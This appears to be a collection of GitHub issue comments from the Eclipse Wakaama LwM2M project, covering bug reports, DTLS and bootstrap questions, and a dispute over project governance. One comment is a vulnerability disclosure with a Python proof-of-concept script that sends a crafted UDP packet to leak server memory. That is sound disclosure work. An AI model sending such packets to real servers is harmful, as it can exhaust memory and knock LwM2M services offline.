Hi @davidgraeff We have done some study on the source code about this issue. We suspect such as work flow introduced this problem.

1) the device go offline in fact, but not detected by the lifetime timeout yet
2) lwm2m_observe() was called on the object of this device
3) device offline detected by timeout, then registration_handleRequest() removed all the observation context for the client
4) the observe transaction timeout, prv_obsRequestCallback() tried to free the same pointer attached in the transaction.
5) the exception happened as it was already freed.

ln regard to the fix, it looks the observation context management is pretty fragile, a fix to this single issue may not solve similar problems. Please refer to the picture I attached, the observation pointer can be referred by many ongoing transactions. That can introduces many breaks.

To remove the complexity, one option will be let each transaction (observe/cancel obs) have a new allocated context object. We only do change to the observationList in the transaction internal callbacks. If a observation is already present for the object, then remove the existing and add the new one into the list.

Assuming the transaction memory freeing mechanism is solid, it will help to ensure any context attached to the transaction can be properly freed.

We would like to know what is the plan on the issue.  We could make changes in our project and then contribute to the project.  We don't prefer a private fork because it is burden for maintenance.

Here is what I wrote:
gps_read might work if *numDataP is 0, but it probably won’t work any other way. The arrays for the children should be allocated in the do loop. You are also hardcoding the indices instead of using the current index. Here is an example of what I think one case it should look like:
```
            case RES_M_GEOFENCING_LAT:
            {
                //lwm2m_data_encode_float(data->geofencing_lat, *dataArrayP + i);
                lwm2m_data_t *instances = lwm2m_data_new(2);
                lwm2m_data_encode_float(data->geofencing_lat[0], &instances[0]);
                lwm2m_data_encode_float(data->geofencing_lat[1], &instances[1]);
                lwm2m_data_encode_instances( instances, 2, *dataArrayP + i);
                result = COAP_205_CONTENT;
                break;
            }

```
You probably have problems with the hardcoded indices in gps_write also. It should look more like this:
```
            case RES_M_GEOFENCING_LAT:  
                 //if (lwm2m_data_decode_float(&dataArray[i], &data->geofencing_lat) == 1)

I am trying to implement bootstrapping where the main server and bootstrap server both are kept in secure modes. Although I am able to achieve ready state ie client is registered successfully on Leshan/client when bs server is insecure and the main server is kept in secured mode.

But when I try same with bs secured and during port switching occurs between 5784(bs server) to 5684(main server) some packet is sent to the client but no response comes from the server.

This might be some incorrect data being sent to the main server due to which server doesn't respond.

Is Bootstrapping supported when both bs server and dm server are in secure mode?

Please guide me in resolving the issue. Do I need to decrypt the packets exchanged if yes then please guide accordingly.  

For you reference putting my logs captured.

I suspect when we are using the Bootstrap server in secure mode problem occurs. My question is can we implement Bootstrapping using a Bootstrap server with Leshan server both in secure modes. For your information, we are also used local daemon python code to facilitate connection with the server which opens a local socket with the client at 127.0.0.1 due to which we are getting initial packet exchanges with the same IP.

I can infer with logs that we are sending some packets to Leshan server to which response is not received. Is secure mode BS server supported by Leshan server?

So when can rule out a wrong configuration of the leshan server account.

I thought the BS Server was deployed locally but it seems you are also using `leshan.eclipse.org` for bootstrapping, right ?

If this is the case, my bet is on a DTLS issue. A DTLS session is created to connect to the BS Server. When connecting to the LwM2M Server, as the hostname is the same, maybe your implementation reuse the same DTLS session. Thus registration packets are sent to the BS Server instead of the LwM2M Server.

Actually, I am trying implement Bootstrapping via DTLS connection and the client fails to register and I get error

So is this the reason why my client cant be registerd as Bootstrapping via DTLS is not supported.

I might have interpreted it wrong.
 
Still I am curious to know bootstrapping could be achieved using DTLS security when Leshan bs server and Main Leshan server are accessed in secure mode.

I also tried once and faced similar issues with virtual box.
In my case the server was installed in an independent Linux machine and
client was installed in a Virtual Box and Host PC being a Windows 7.

Then switched to Raspberry Pi for connecting.
The client through a virtual machine is not able to send packets out of the
host computer.
If the LWM2M server is also in your control, then I suggest running an
example udp server/client programme and see if you are able to connect.

https://www.geeksforgeeks.org/udp-server-client-implementation-c/

Let me know if you are able to connect.

Also you able to ping the server IP from client Virual Box and ping client
Virtual Box from server in the present scenario?

Thanks & Regards,
Amrit Pal Singh.

Hi @dnav

Note that the Server port in your command should be `5683` if you did not change the default when launching the Server.

If packets are sent by the Client, then the next step is to check that the Server receives them. So you should run wireshark on the Server box. If packets are not received then your problem lies in the network configuration.

Hi @apsk25,

Yes, that's a good suggestion. But I need a little guide (first step), how to run the examples you sent. Do I need to copy any file to the remote server (eg. UDPServer.c), or build environment with both files on my localhost.

you need to compile the code.
You can compile from either the client or server.
But the server binary has to run on server and client binary on client

You can run both first on localhost i.e both the server and client binary
on localhost, just to make sure that the binaries and the code is  working
fine.
And then run on separate machines.
Dont use virtual Box in this trial.

  I'm currently trying to understand how to handle correctly server fail-over with LWM2M protocol.
  The main issue is about the DTLS connection. As generally there are lost after a reboot.

  1. A solution could be to persist/share DTLS connection but currently I don't know any implementation which are able to do that. (I'm not even sure if this is a good thing to do..)

  2. The other solution is to do a new handshake when DTLS connection is lost.
  There is 2 use cases, ""queue mode"" and ""standard mode/none queue mode"". For queue mode, I don't see any issue. But for ""standard mode"", this is more problematic and the only solution I can see is ""DTLS role exchange"".

   [Here](https://github.com/OpenMobileAlliance/OMA_LwM2M_for_Developers/issues/410) is a more complete description of the LWM2M issue.  
   [Here](https://github.com/sbernard31/dtls-server#dtls-role-exchange) is a more precise description of what I name ""DTLS role exchange"".

   So I'm experimenting this idea (with PSK for now). I succeed to make it works with `leshan-client-demo` and `leshan-server-demo`.

   I try with `lwm2mclient` of wakaama and `leshan-server-demo`, but it failed just because of some little bugs. I fixed those bugs in this PR #397 and it seems OK now.

   If you want to test. You can simulate the  `leshan-server-demo` fail-over using redis and really restarting the server. Or more simple way you can take [this modified version of `leshan-server-demo`](https://github.com/sbernard31/leshan/releases/download/DTLS_Exchange_Role/leshan-server-demo-1.0.0-SNAPSHOT-jar-with-dependencies.jar) and use the `clear` command to delete all the DTLS connections.

This looks like this :
```
>> java -jar leshan-server-demo-1.0.0-SNAPSHOT-jar-with-dependencies.jar      
[main] INFO  o.e.l.s.c.i.LeshanServer - LWM2M server started at coap://0.0.0.0/0.0.0.0:5683 coaps://0.0.0.0/0.0.0.0:5684 
[main] INFO  o.e.l.s.d.LeshanServerDemo - Web server started at http://0.0.0.0:8080/. 
clear
[main] INFO  o.e.l.s.d.LeshanServerDemo - DTLS Connections cleared 
...
```

I would really appreciate to know your opinion about this ? (especially @dnav)

I hope this idea of exchange the DTLS roles will not also get a hot spot of issues caused by misunderstandings of the network environment.

So, just to mention:
A resuming handshake with exchanged roles would also be possible. 
On the LWM2M server side implement a persistent `ClientSessionCache` and after restart scandium would try a resuming handshake. A a resuming handshake with exchanged roles would not require to use the ""credentials"" and seems FMPOV easier.

One issue, which may occur (hopefully not to frequently), will be overlapping handshakes from the LWM2M server and the LWM2M client. That will fail. But you will find it out, if it is that frequent, that something is required to solve that issue, or not.
Finally, I would really appreciate, if in the end we get some statistic about successful and failing ""reverse"" handshakes.","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/comments/MDEyOklzc3VlQ29tbWVudDQzNTQ3MTEyMA==/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

Two client devices both are in registered status and notifying data to the wakaama server. However only one client can be seen from the server side.

The possible reason:
one client (#1) is actually a process running in the same machine as wakaama server, another client (#2) is an independent device. The server and client #1 both had a  reboot and client #1 registered as ID 0. however the client#2 was also registered as internal ID 0 previously.  Now the server and both clients can not tell any problem for this situation.

Solution options:
1. the wakaama server should not always start allocating internal ID from 0. It better be some random number. That can reduce the possibility of this situation
2. the wakaama server can check the source IP/port for Update/Notify messages and reject it if not match the original address from registration. The current wakaama design is just update the client to the new source address.

It is not clear (to me) what the problem is that should be fixed. `registration_getStatus()` ""aggregates"" a number of `lwm2m_status_t` states according to this logic (quoted from the function definition)

> Returns STATE_REG_PENDING if at least one registration is still pending
> Returns STATE_REGISTERED if no registration is pending and there is at least one server the client is registered to
> Returns STATE_REG_FAILED if all registration failed. 
 
The `lwm2m_step()` handles the `lwm2m_client_state_t` state transition logic using `registration_getStatus()`. A STATE_REG_FAILED response result in a state transition to STATE_BOOTSTRAP_REQUIRED, see attached powerpoint.
Aggregating and ""reusing"" a state name like this can be confusing but the logic is correct or am I missing something?

This makes sense and is safe. If no reply is received from any retransmission, transaction timeout will cause transition to `STATE_DEREGISTERED` anyway. Little practical difference for the client state logic (only timing).

Not including refactoring in this bugfix. New states to solve the ""reuse"" problem is not without drawbacks, suggest a separate improvement issue if we want to refactor this, also including the `bootstrap_getStatus()` function.

I created a temperature object `object_temperature.c`, and modified `lwm2mclient.c` and `lwm2mclient.h` as appropriate, but I am abit confused, here what I want to do.

I have already `LWM2M device` sending temperature measures to an `sqlite3` backend. Now I want the `object_temperatur.c` fetch recent temperature and forward to `LWM2M server` (actually within FIWARE).

I implemented the `db transaction` within `prv_temperature_read()` of the `object_temperature.c` but I'm not sure how the `prv_set_temperature()` function works. Should I pass the temperature value to this function to get reported to server?  Or just implement (do a `stringToUri`) from within `prv_temperature_read()`.","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/comments/MDEyOklzc3VlQ29tbWVudDQ1MTkyNjYyOQ==/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

Sorry my question above may be a bit misleading. Please let me clarify it. 

I am thinking that wakaama don't ""download"" certificate from the bootstrap server (ignoring the dtls authentication process with the lwm2m server that is to come later). From my understanding the bootstrap process is just the bootstrap server write authentication info into the security object of the lwm2m client and the lwm2m client take that info to authenticate with the lwm2m server (please correct me if I am wrong).  In the PSK case the client got the credentials (which I printout and checked with info on bootstrap server), but client does not ""download"" certificate correctly. So, again I was wondering whether certificate is supported by wakaama . The file liblwm2m.h defined:

> #define LWM2M_SECURITY_MODE_PRE_SHARED_KEY  0
#define LWM2M_SECURITY_MODE_RAW_PUBLIC_KEY  1
#define LWM2M_SECURITY_MODE_CERTIFICATE     2
#define LWM2M_SECURITY_MODE_NONE            3

so I was expecting wakaama support use of certificate. The real secure communication should be taken care by OpenSSL or mbedTLS.","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/comments/MDEyOklzc3VlQ29tbWVudDQ1MDg3NDAwMg==/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

Your understanding of the bootstrap process is close, but the bootstrap server also writes a server object that has non-security related information about the server, such as the registration lifetime. This probably isn't relevant to your question, I just wanted to be clear that the bootstrap process is more than just the security object.

The bootstrap server writes all the authentication info to the security object, the client doesn't download anything. In the PSK case, there is no certificate. There is only the key and the identity. I suggest you review Appendix E.1 of the LWM2M technical spec (http://www.openmobilealliance.org/release/LightweightM2M/V1_0_2-20180209-A/OMA-TS-LightweightM2M-V1_0_2-20180209-A.pdf) if you haven't already.

If you are just trying to bootstrap with certificate mode, it might succeed but the sample security object isn't really written to handle it. There may be other problems, such as leaking memory, when using it for RPK or certificate mode.","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/comments/MDEyOklzc3VlQ29tbWVudDQ1MDg4Mzc1Mw==/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

When compiling our custom LwM2M server based on **wakaama/core/liblwm2m.h"" with -O2 optimization level, LwM2M Client Names are limited to 11 characters, compiling the same code without any optimizations avoids this problem. This was tested with wakaama lwm2mclient example. 

## Possible solution 
Adding volatile keyword to size_t option_len in  **wakaama/core/er-coap-13/er-coap-13.c:257** fixes the problem.

```
-- coap_add_multi_option(multi_option_t **dst, uint8_t *option, size_t option_len, uint8_t is_static)

If you do that, I would recommend checking more frequently than it could change to avoid missing changes.

I'm very sorry to write on this issue again, but I'm still having trouble. I would appreciate if you could kindly take a look at my code to see what I'm doing wrong. I ignored the database transaction part, instead get temperature value change directly. To simplify my research, I used wakaama files as they are, then add following:

I can confirm the Agent is still observing inappropriate resource `/3303/0/0` instead of `/3303/0/5700` despite that I declared the resource id in my `object_temperature.c`
```
// Resource Id's:
#define RES_SENSOR_VALUE    5700

@sbertin-telular 
The program compiles, client built successfully. It gets registered to the IoTAgent, then crashed immediately. As soon as it passes the call to `lwm2m_resource_value_changed()` stage. 
It works only when I comment-out `lwm2m_resource_value_changed()` and rebuild.","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/comments/MDEyOklzc3VlQ29tbWVudDQ2NTIzOTUxMg==/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

Processing of the single crafted packet leads to leaking (wasting) 24 bytes of memory.
This can lead to stopping of the LWM2M server after exhausting all available memory.
Depending on server configuration and isolation of services, this can stop also other processes on the same server.

Proposed CVSS 3.0 Score:

On systems with modern memory protection and isolation of services:
5.3 (medium) - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L

On systems with lower memory protection and no isolation of services:
7.5 (high) - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

Reproduction:

1. Wakaama must be compiled with Leak Sanitizer (or other similar tool) by setting compilation flag:
    C_FLAGS = -fsanitize=address

2. Run Wakaama server as:
    lwm2mserver -4 -l 55555

3. Run following Python2 script (running multiple times will show larger leak):

    -------------------------------------------------------

    import sys
    import socket

    WAKAAMA_PAYLOAD = ""4402e6e2e2e68167b2726411""
    out_data = WAKAAMA_PAYLOAD.decode('hex')
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM )
    s.sendto(out_data, (sys.argv[1], int(sys.argv[2])))

    -------------------------------------------------------

    Execution of the script:

    python2 wakaama_test.py dst_ip dst_port
    (where: dst_ip and dst_port are IP and port of tested Wakaama server)
    e.g.:
    sudo python wakaama_test.py 192.168.0.101 55555


4. Close the lwm2mserver to get report from Leak Sanitizer:

    > 12 bytes received from [....]:....
    44 02 E6 E2  E2 E6 81 67  B2 72 64 11   D......g.rd.

There must be some code, which loads those configuration and set it to the `DtlsConfiguration` instance.
You may use WireShark to see, if still application records are used (then no cid is used), or not.

> One more question, if I fixed connection-id in client side, and I reboot the device, it will do complete handshake or only re-handshake with simple flows.

That's a misunderstanding! To really reboot a peer, the association credentials (read/write key, sequence number and the assigned connection id) has to be persisted and loaded again. That's possible to implement, but right now, not implemented in Californium.  
With that, you would not need a handshake at all, you would be able to send the message encrypted immediately. To save the keys come with the risk, that some else is reading them. So it's critical to save 
this key secure enough according your requirements.

Without that persistent ""association"", the behaviour doesn't differ from the one without connection ID. If the session (master secrets etc., but not the read/write keys an sequence numbers as for the association) is persisted and loaded again (that's supported, see [ClientSessionCache](https://github.com/eclipse/californium/blob/master/scandium-core/src/main/java/org/eclipse/californium/scandium/dtls/ClientSessionCache.java) you can do a resumption handshake, if not. a full handshake is required. Saving the session is also security relevant and must be protected according your requirements.

There are still some items not yet implemented (no particular order):
•	New attributes (Minimum/Maximum evaluation period) and attributes at the resource instance level. Attributes as a whole could use a rework to be compliant.
•	Write-Composite. With the current Wakaama design I’m not sure this can be implemented atomically.
•	Observe-Composite
•	Cancel Observation-Composite
•	TCP binding. @dnav  has said (wakaama-dev 2/20/2019) that he has already implemented it, but it hasn’t been released yet.
•	LWM2M 1.1.1 compatibility changes
•	New optional resources in objects for the client example
•	OSCORE. @dnav  has said (wakaama-dev 2/20/2019) someone is working on this.
•	Enforcing access control. LWM2M 1.1.1 makes this optional for an “Access Control-Disabled” configuration where only 1 server is supported.

I have been able to reproduce this error consistently using the leshan server available at leshan.eclipseprojects.io  and also with  a LWM2M server from a Vendor. It seems that always happens when all resources associated at instance 5 are read (/5/0), it doesn't fails when each resource from instance 5 is read individually.

Error returned by leshan server is: _unable to read /5/0 for XXXX: 500 Request Timeout_

* ~~There seems to be no show-case product/company using Wakaama. At least not in a way, which would make it easy for me to convince management to got with it.~~ Actually, there are a few!

The §6.3.1 tries to encourage a format which guarantee uniqueness, this a hint.
And so could be used though several servers.

The specification 1.1.x give more hints about that: 
_""The Endpoint Client Name identifier MUST be unique at the server or servers it is being used with.""_  ( see [7.3.1. Endpoint Client Name](http://www.openmobilealliance.org/release/LightweightM2M/V1_1-20180710-A/HTML-Version/OMA-TS-LightweightM2M_Core-V1_1-20180710-A.html#7-3-1-0-731-Endpoint-Client-Name))

>  Do i have to support multiple endpoint names if i am using PSK for encryption? One for each server?

I would say no. You are using only one endpoint name and you can eventually used different PSK identity but at servers side you should say : ""on this server, the device will this endpoint name MUST use this PSK identity"" and server should check this.

This is how I understand : 
_""This comparison may either be an equality match or may involve a dedicated lookup table to ensure that LwM2MClients cannot intentionally or due to misconfiguration impersonate other LwM2M Clients._"" (source LWM2M 1.0.2 §7.15)

>  Do i have to use the resource /0/x/3 as endpoint name? Is there anything i am missing?

I would say no too. When using PSK, this is for  PSK Identity not the endpoint name.","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/comments/MDEyOklzc3VlQ29tbWVudDY2MjQ2MTIxOA==/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

Two ways to go:
- @sbernard31 do you know, how to setup the wakaama client to accept a CLIENT_HELLO, if the client has still a established session?
- try out to configure the leshan server not to start handshakes. Ask in that project, how to achieve that.

I made it works long time ago but I'm not up to date now. 
See  https://github.com/eclipse/wakaama/issues/398. It worked after some little fix which was merged in master.

I have not received any communication from the Eclipse Foundation in the last six months.

The last communication we had was in February with Frédéric. I had the impression that there was an understanding of the status of Wakaama. Wakaama is a LwM2M 1.0 reference implementation. It is a foundational baseline and was never intended to be a complete product. To quote my discourse from that discussion:

> The consensus among users of Wakaama is that the project is complete. I had discussions with various industry people, and they are all satisfied with the current feature set. Of course, most have implemented additional features, but few want to contribute their features to Wakaama. This part should illustrate why new contributions did not get meaningful feedback: people are happy with the status quo and are reluctant to see new features coming to Wakaama. Yes, even LwM2M 1.1. They see that as a disruption of their current deployed setup.

Some additional points we should consider about the Wakaama project:

1. This is an open-source project.
    The license is permissive. If you are not satisfied with the direction, or the content of this project, fork it, as Scott did. Authorization is not required. 

2. This project is free (as in beer). No one owes anything to anyone.
    As previously mentioned, many large corporations have benefitted from this Wakaama, and added needed functionality in their self-interest without contributing in any way, shape, or form, and that is okay. People contributing are either doing it in their free time or to answer their own business needs. If you need something missing from it, and if your employer is okay for you to spend time and money working on this, do it. Otherwise, get something with additional features, complete documentation, and a full-time team supporting it like https://github.com/IOTEROP/IOWA.

To all the users of Wakaama during these years, thank you for your interest. Just remember that software, like any other work, has value.

Sincerely,
dnav

I didn't follow precisely what happened with wakaama last month, but I can maybe give some hints about the current situation.

**About communication issue :** 
> I have not received any communication from the Eclipse Foundation in the last six months.

Email was sent as you can see : https://www.eclipse.org/lists/iot-pmc/msg06997.html (your were in copy, your ioterop.com address was used)
Maybe an issue with your email provider ? 

**About scope of the project :**
>  Wakaama is a LwM2M 1.0 reference implementation.

It seems this was not clear for the community and we can not blame it as there is nothing about this in documentation(readme or websites). 
And by the past you let understand that wakaama will support LWM2M 1.1 : https://www.eclipse.org/lists/wakaama-dev/msg00506.html

So not really surprising that people expect LWM2M 1.1 support.

**About community expectation :**

> The consensus among users of Wakaama is that the project is complete
> people are happy with the status quo and are reluctant to see new features coming to Wakaama.

This sounds clearly not the case when you see all the open PRs and issues.

> Yes, even LwM2M 1.1. They see that as a disruption of their current deployed setup.

I do not understand, generally this problem is solved using semantic versioning (or something like this).
 - one stable branch (1.x or 1.0.x) with bug fixes and not so much changes.
 - another one (2.x) for new feature with big API changes.

Of course people who are happy with the current version is not forced to upgrade.

> The license is permissive. If you are not satisfied with the direction, or the content of this project, fork it, as Scott did. Authorization is not required.
> No one owes anything to anyone.

Maybe, I'm wrong and @fdesbiens  will correct me, but I think this is not so true for eclipse project. An eclipse project is more than that. Committers are responsible to make the project ""alive"" at least by answering to community. They should also facilitate contribution and integration of new committers etc etc .. (see https://www.eclipse.org/projects/dev_process/#2_1_Open_Source_Rules_of_Engagement)
If there are no time or willingness to continue to make the project alive, committers should at least help to pass the torch.(I'm not sure this expression is really used in English :sweat_smile:)
If nobody is interested by the project anymore it should be archived.

>  If you need something missing from it, and if your employer is okay for you to spend time and money working on this, do it

Community try to do it but nobody integrate the changes :confused:

> Otherwise, get something with additional features, complete documentation, and a full-time team supporting it like https://github.com/IOTEROP/IOWA.

Maybe, I didn't get you but you seem a bit disappointed that there is not enough contribution to Wakaama project but at same time you encourage people to use your new closed-source solution. It sounds confusing to me. 

But to be honest, I still don't get what is your position about Wakaama project. Do you still feel as project lead ? or are you considering that the project is ""finished"" and should be archived ? I don't get it ?

I am glad to see you are still around.

I am surprised you think we had reached an understanding. In my last private to reply to you, sent on January 20, I wrote this:

> I understand that a large part of the user base is happy with the code and not looking for new features. However, at least a few members of your community seem to have a different opinion. 
>
>Obviously, it is up to the project team to decide where Wakaama will be headed. That being said, I would strongly recommend to explore ways to accommodate people like Scott. A possible way, for example, would be to declare the current 1.0 release train as a long term support (LTS) branch that would live in parallel to a 2.x branch implementing new features. There are many other ways to achieve the same result. What do you think?

You never replied to me. This led me to bring the matter to the PMC.

Jens sent several emails to the PMC list and to the same ioterop.com address my email had been sent to. You never replied to any of them.

In [the last one](https://www.eclipse.org/lists/iot-pmc/msg07042.html), he wrote this.

> Shouldn't I hear back from you in the next week (which should make this a period of 4 weeks), my recommendation to EMO would be, to declare the project dysfunctional, so that we can elect new project leads and/or committers.

We are well past that date. 

Since April, I worked hard to find people willing to continue working on the project. We now have four potential committers willing to jump in. 

If you consider Wakaama is complete, what you have is not a project but just a dead repository. Projects have roadmaps, respond to issues and have commits. Dead repositories do not have a community around them and certainly do not contribute to the improvement of the Eclipse ecosystem. Moreover, as @sbernard31 mentioned, projects and committers have obligations to the community. I am sure @waynebeaton can provide more details.

The simple fact this GitHub issue exists shows there are people who wish to push Wakaama forward. 

So, David, the choice is yours. 

If all you care about is a reference implementation set in stone, then you can create your own static fork of the current repository and live happily ever after.

If you still wish to be part of the team, then I am sure the new committers will welcome your leadership and contributions. However, this means you will have to agree with them on a new course and scope for the project in an open and democratic fashion. 

Since you saw the previous messages in this thread, I expect you will read this one very soon. Please let us know as soon as possible if you wish to be part of the project's future.

Hypothetically, there may be some limitations on what can be claimed with regard to a specification, but I am not aware of any such limitations. Without having specific knowledge of the governance of the specification process to which Eclipse Wakaama contributes a reference implementation, I have to assume that as long as the 1.0 version remains tagged, it may continue to be the reference implementation while the project progresses.

Independent of any claims regarding specifications, the project is open source and the Eclipse Foundation's definition of open source requires that a project be both [open and transparent](https://www.eclipse.org/projects/dev_process/#2_1_Open_Source_Rules_of_Engagement). Note that our particular definition of open means ""open to input from others"" (we often refer to this as a ""level playing field"").

With respect, ""you can fork it and do what you want"" does not conform to the Eclipse Foundation's definition of open source.

Having said all that, a Eclipse open source project is required to operate within its defined scope. If the contributions are within [scope of the Eclipse Wakaama project](https://projects.eclipse.org/projects/iot.wakaama/governance), then the contributions need to be given fair consideration for merging. It is completely reasonable, however, for a project team to reject contributions that fall outside of the project scope. It is not reasonable for a project team to completely ignore contributions (FWIW, there are a lot of open source projects that would love to have twenty pull requests).

By my observation, the project is no longer active. According to our process, in the absence of a compelling reason to do otherwise, the project should be terminated and archived. Alternatively, the project leadership chain (which includes the PMC and EMO) may declare the project dysfunctional and [replace the development](https://www.eclipse.org/projects/dev_process/#4_6_Leaders) team.

As people already mentioned, that is not true. And I do think that this is indeed a big problem. If the people leading the project cannot be contacted.

> By my observation, the project is no longer active. According to our process, in the absence of a compelling reason to do otherwise, the project should be terminated and archived.

I think the PMC already came to the same conclusion a while back. We already asked EMO to declare the project dysfunctional a while back. And we also took quite some extra time to discuss options, alternatives, … 

To me, this issues doesn't change the current situation of the project, and I would propose to continue with the plan do declare the project dysfunctional.

As @waynebeaton already mentioned, curating a specific version/tag/state of the repository is no problem at all. But development should be allowed to progress. The project still continues to be an Eclipse project, and thus allows current and new committers to work in the defined project scope. Existing committers can still work on the project, as they can now, if they wish to do so.

@waynebeaton if you need any additional +1 from the PMC, please let me know and I will start another e-mail thread.

I don't think that anybody has made any consideration of your employment status. To be clear, while we do need certain paperwork from committers to ensure that they have their employer's approval to contribute to open source projects, employment status is otherwise irrelevant. In case there is any confusion, with a very small number of exceptions (mostly the Eclipse Dash and Eclipse CBI projects), the Eclipse Foundation does not employ any project leads or committers.

There appears to be some confusion regarding the project lead and committer roles, so I'd like to spend a minute to discuss what we're doing here in the larger sense.

The Eclipse Foundation Development Process (EDP), which all committers and project leads agree to implement, is all about building a community and ecosystem around open source technology. This means that committers and project leads agree to build up and, at least in part, serve a community around their technology. At least in part, that means that committers and project leads sign up to court contributor participation and help them with the contribution process. To do this successfully requires giving up any idea of absolute control and allowing others to participate on a level playing field (with in the scope of the project). Our most successful open source projects have committers representing a wide diversity of interests, employers, and backgrounds.

The project has zero active committers and so I agree with the PMC's assertion that we are in an exceptional situation. 

So now what? 

My strong preference is that the existing project team return to an active state and that they [start an election](https://www.eclipse.org/projects/handbook/#elections-committer) to bring aboard new committers to increase their diversity. Are any of the committers on this thread prepared to do that? FWIW, the project has three committers: all of them will need to vote in order for a committer election to conclude successfully.

That failing, as is outlined in the EDP, the project leadership chain (the project lead, PMC, and EMO) has responsibility to adjust the composition of the project team to get the project back into an active state. Who should be removed and who should be added? 

My recommendation is that we (the PMC or EMO) take this to the [wakaama-dev](https://accounts.eclipse.org/mailing-list/wakaama-dev) list.

I'm not sure, if I understand, how you want to continue. I don't want to force something nor someone nor offend someone. As many others feel, that it's better to have ""fresh committers"", I would go to start such an committer-election, as @ctron has requested in an e-mail.

At least for Leshan we have difficulty to follow you (OMA). Maybe **a little part** of explanation could be that sometime this is hard to get answer from OMA on not so clear parts of the specification or blind spots. I think investing more time on [OMA github issues](https://github.com/OpenMobileAlliance/OMA_LwM2M_for_Developers/issues) could help a bit.

In a perfect world, we(implementer and specifier) should be synchronized (we should start to implement version which is currently writing, not an already released one)
This way we could report you issue that could be fixed before you release the version.
Currently, we are de-synchronized and when  we find issue sometime this is too late to fix in the specification. Sometime this issue generates more effort for implementer and can slow us a bit more.

@boaks,
I have no objection (but as I'm not committer on Wakaama not sure my word is useful :slightly_smiling_face: )
Hoping the project will be on track quickly :crossed_fingers:

Allow me to reply to this particular comment. The work on the LwM2M specification at the OMA is following implementations.

Each feature from 1.0 to 1.2 is coming from a real world usage and the technical solution comes from what was implemented to answer it. OMA members then contribute to the standard for the sake of interoperability.

The best proof that the specifications are implementable is the several testfests organized by the OMA.

[Developer's Forum]

Unlock Your Organization's IoT Device Management Capabilities with LwM2M

The benefits of using the Lightweight Machine to Machine (LwM2M) protocol to connect and manage IoT devices are noteworthy: reduced power and data consumption, firmware over the air (FOTA) updates and using latest security are just a few of the highlights. The freedom of not having to rely on a proprietary technology or build and maintain your own network is why many organizations looking for a sustainable IoT solution have chosen LwM2M.

But what exactly is LwM2M, and how does it stack up against the other technologies, such as MQTT? How difficult is it to implement, and what are the implications for an engineering or dev team? Join us for this free forum on 8 September at 16:00 CET and discover the potential that LwM2M has to offer.

@rettichschnidi, It sounds a good idea, but should we integrate ""our"" PR first ? I mean PR written by you and your teammates and @sbertin-telular.  The idea is to avoid that too many people resolve conflict at the same time and so by the way generate new one ? (I'm not sure I'm clear :thinking:)

> While being at it, asking the PR creator to squash the commits sounds worthwhile to me too (but maybe a bit too much to ask as for this project there seems to be no such requirement/recommendation for PRs as of today)

We can ask to politely  squash commit and also say that if they can not we will do it (once PR is rebased without conflict, it's easy to squash.)

About recommendation, I will create an issue to discuss about creating/adding all ""classic"" community documentation.","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/comments/MDEyOklzc3VlQ29tbWVudDcyMTcyODczMA==/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

1. try to support this in the same branch (master)
2. try to create a dedicated `1.x` branch.

(Personally, I didn't know the code enough to be sure that 1. is doable)

About API compatibility, this is another question : 
 - I guess keeping API compatibility for `master` will be too hard. (To support LWM2M 1.1, I guess breaking API will be hard to avoid)
 - eventually keeping API compatibility for a `1.x` branch which targets only LWM2M 1.0 is maybe doable.
 - it is also possible to create a `1.x` branch which targets  LWM2M 1.0 only without API compatibility. As long as we document/communicate on this.

I would expect that just following github, you should be enough to understand what happens on the project.
The other advantages with github : 
 - is to be able to link old comment and so avoid to repeat yourself
 - answers or discussions are indexed by search engine.

Anyway, if team thinks this is better to have instant messaging : 
[Eclipse community](https://wiki.eclipse.org/Mattermost/About) handles a [mattermost](https://mattermost.org/) instance : https://mattermost.eclipse.org

Personally, I'm not fan of this : 
- you lost the discussion history (no way to link comment or to have search engine index)
- only present people can know what was said. (or you need to archive audio/video ...)
- this is synchronous way (more complicate for people to join a discussion afterwards)
- people need good spoken english to participate.

Sounds like a good idea. Also, AFAIK a Matrix server can be configured to allow people without an account to access the discussions, similar to public IRC logs. Not sure if this is the case of Eclipse, so I will ask in #eclipsefdn.chat-support:matrix.eclipse.org. (Edit: Will be implemented: https://gitlab.eclipse.org/groups/eclipsefdn/it/releng/chat-service/-/epics/2)

Given this new situation of an official service hosted by Eclipse, I re-open this issue so that we can see whether opinions have shifted about using such a service.

Mine: I'd like to give it a try. Willing to ask IT to create a room for us.

- [ ] Remove TODO file in repository and create corresponding issue if needed

~Maybe the 1.0 release description needs more love too : https://github.com/eclipse/wakaama/releases/tag/v1.0~

Even if this is not perfect you could have a look to Leshan project as inspiration.  (or any other eclipse project or popular open source project)
